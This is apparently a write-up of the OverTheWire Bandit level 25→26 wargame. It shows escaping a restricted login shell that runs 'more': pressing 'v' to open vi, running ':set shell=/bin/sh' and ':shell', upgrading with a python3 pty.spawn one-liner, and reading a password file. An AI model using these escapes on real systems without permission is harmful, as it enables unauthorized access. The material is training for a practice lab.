# Bandit Level 25 → Level 26

## Level Goal

Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not **/bin/bash**, but something else. Find out what it is, how it works and how to break out of it.

> NOTE: if you’re a Windows user and typically use Powershell to `ssh` into bandit: Powershell is known to cause issues with the intended solution to this level. You should use command prompt instead.

## Commands you may need to solve this level

ssh, cat, more, vi, ls, id, pwd
## Methodology
- First thing first we have to login as bandit25.
```
└─$ ssh bandit25@bandit.labs.overthewire.org -p 2220
                         _                     _ _ _   
                        | |__   __ _ _ __   __| (_) |_ 
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_ 
                        |_.__/ \__,_|_| |_|\__,_|_|\__|
                                                       

                      This is an OverTheWire game server. 
            More information on http://www.overthewire.org/wargames

backend: gibson-0
bandit25@bandit.labs.overthewire.org's password: 
```
- Till now, we know that bandit26 is not using /bin/bash shell, then which shell zsh, sh, fsh, ksh?
- Let's enumerate bandit25's home directory.
```
bandit25@bandit:~$ ls -al
total 40
drwxr-xr-x   2 root     root     4096 Jun 24 14:59 .
drwxr-xr-x 150 root     root     4096 Jun 24 15:02 ..
-rw-r-----   1 bandit25 bandit25   33 Jun 24 14:59 .bandit24.password
-rw-r-----   1 bandit25 bandit25  151 Jun 24 14:59 .banner
-rw-r--r--   1 root     root      220 Feb 13 12:16 .bash_logout
-rw-r--r--   1 root     root     3851 Jun 24 14:50 .bashrc
-rw-r-----   1 bandit25 bandit25   66 Jun 24 14:59 .flag
-rw-r-----   1 bandit25 bandit25    4 Jun 24 14:59 .pin
-rw-r--r--   1 root     root      807 Feb 13 12:16 .profile
-r--------   1 bandit25 bandit25 2602 Jun 24 14:59 bandit26.sshkey
```
- Here we have ssh private key for bandit26, let's copy-paste into our machine and set necessary permissions. I have checked rest of the files, all are related to previous level.
```
┌──(kali㉿kali)-[~/Desktop/overthewire]
└─$ nano bandit26sshkey 
                                                                    ┌──(kali㉿kali)-[~/Desktop/overthewire]
└─$ chmod 600 bandit26sshkey 
                                                                                 
┌──(kali㉿kali)-[~/Desktop/overthewire]
└─$ ls -l
total 4072
...
-rw------- 1 kali kali    2692 Aug 13 05:27 bandit26sshkey
...                                     
```
- Let's try to login into bandit26. When tried it kicks us out showing this.
```
┌──(kali㉿kali)-[~/Desktop/overthewire]
└─$ ssh -i bandit26.sshkey bandit26@bandit.labs.overthewire.org -p 2220
...
...
...
  Enjoy your stay!

  _                     _ _ _   ___   __  
 | |                   | (_) | |__ \ / /  
 | |__   __ _ _ __   __| |_| |_   ) / /_  
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \ 
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
 |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/ 
Connection to bandit.labs.overthewire.org closed.
```
- I guess, it's reading some file and then exits because this welcome screen is different from other levels.
- Okay bandit26 is not using /bin/bash, then which one?
- Some enumeration on home directory of bandit26.
```
bandit25@bandit:~$ cat /etc/shells 
# /etc/shells: valid login shells
/bin/sh
/usr/bin/sh
/bin/bash
/usr/bin/bash
/bin/rbash
/usr/bin/rbash
/usr/bin/dash
/usr/bin/screen
/usr/bin/tmux
/usr/bin/showtext
bandit25@bandit:~$ ls -al /home/bandit26
total 44
drwxr-xr-x   3 root     root      4096 Jun 24 14:59 .
drwxr-xr-x 150 root     root      4096 Jun 24 15:02 ..
-rw-r--r--   1 root     root       220 Feb 13 12:16 .bash_logout
-rw-r--r--   1 root     root      3851 Jun 24 14:50 .bashrc
-rw-r--r--   1 root     root       807 Feb 13 12:16 .profile
drwxr-xr-x   2 root     root      4096 Jun 24 14:59 .ssh
-rwsr-x---   1 bandit27 bandit26 14880 Jun 24 14:59 bandit27-do
-rw-r-----   1 bandit26 bandit26   258 Jun 24 14:59 text.txt
```
- We can read `/etc/passwd` right? 
```
bandit25@bandit:~$ cat /etc/passwd | grep bandit26
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
```
- bandit26 is using /usr/bin/showtext, but i have never heard of this shell. Maybe this is for us.
```
bandit25@bandit:~$ ls -la /usr/bin/showtext 
-rwxr-xr-x 1 root root 58 Jun 24 14:59 /usr/bin/showtext
```
- We have execute permission on this.
```
bandit25@bandit:~$ /usr/bin/showtext -h
more: cannot open /home/bandit25/text.txt: No such file or directory
bandit25@bandit:~$ /usr/bin/showtext --help
more: cannot open /home/bandit25/text.txt: No such file or directory
```
- Why it's showing, `more` cannot open, is it, using `more` to read something?
- Let's look for manual, `man`.
```
bandit25@bandit:~$ man /usr/bin/showtext
...
#!/bin/sh
export TERM=linux
exec more ˜/text.txt exit 0
```
- showtext is using `sh` in shebang line. `more` to open `text.txt` and then `exit`.
- Can we get shell in `more`?
- Yes, we can get a shell in `more` by using `!command`, `!bash` or `!sh` and then Enter. This is not working, due to restricted or disabled shell escapes.
- But we can open `vi` editor in more and in `vim` we will spawn a shell.
- First we have to resize the terminal window as more dispaly page by page, and it display all at once and we don't want that. My terminal window size is 49X3.
```
└─$ ssh -i bandit26.sshkey bandit26@bandit.labs.overthewire.org -p 2220
  _                     _ _ _   ___   __  
 | |                   | (_) | |__ \ / /  
--More--(33%)
```
- Press `v` to open vim, after vim is opened, we can maximize the window.
```
 _                     _ _ _   ___   __
 | |                   | (_) | |__ \ / /
 | |__   __ _ _ __   __| |_| |_   ) / /_
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
 |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/
~                                                                   
~                                                                 
~                                                                   
```
- To spawn a shell in vim, in command mode, `:shell`, but this is exiting automatically.
- We have to set shell first, in command mode `:set shell=/bin/sh` we can also use `/bin/bash` here, and then `:shell`, we have shell now.
- This is basic shell, we have to make it interactive shell.
```
~                  
:shell
$ 
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
bandit26@bandit:~$ 
```
- We can read `/etc/bandit_pass/bandit26`
```
  bandit26@bandit:~$ whoami
bandit26
bandit26@bandit:~$ ls -l
total 20
-rwsr-x--- 1 bandit27 bandit26 14880 Jun 24 14:59 bandit27-do
-rw-r----- 1 bandit26 bandit26   258 Jun 24 14:59 text.txt
bandit26@bandit:~$ cat /etc/bandit_pass/bandit26
REDACTED
```
- We got the password of bandit26, next level.
## Key Takeaways / Concepts
- **Identifying Custom User Shells:** When an SSH login terminates immediately or displays unexpected behavior, checking `/etc/passwd` helps identify if the user is assigned a custom login shell or utility (e.g., `/usr/bin/showtext`) instead of standard shells like `/bin/bash` or `/bin/sh`.
- **Inspecting Custom Binary Scripts:** Reading the source code or behavior of custom entry point scripts (often written with a shebang line executing commands like `exec more`) reveals how the restricted session is constructed and where potential weaknesses lie.
- **Escaping Restricted Pagers (`more` to `vi`):** Pagers like `more` or `less` often allow users to spawn text editors (such as pressing `v` to open `vi`) if the terminal window is sized small enough to require scrolling.
- **Spawning Shells from Editors (`:shell`):** Once inside a text editor like `vi`, you can override or set the shell environment variable (`:set shell=/bin/sh`) and invoke a command shell (`:shell`) to break out of restricted viewers and gain interactive command-line access.
- **Spawning Pseudo-Terminals (`pty.spawn`):** When restricted or basic non-interactive shells lack full job control or features, you can spawn a fully functional pseudo-terminal using Python (`python3 -c 'import pty;pty.spawn("/bin/bash")'`). This upgrades the environment to support standard command execution, line editing, and proper shell prompts.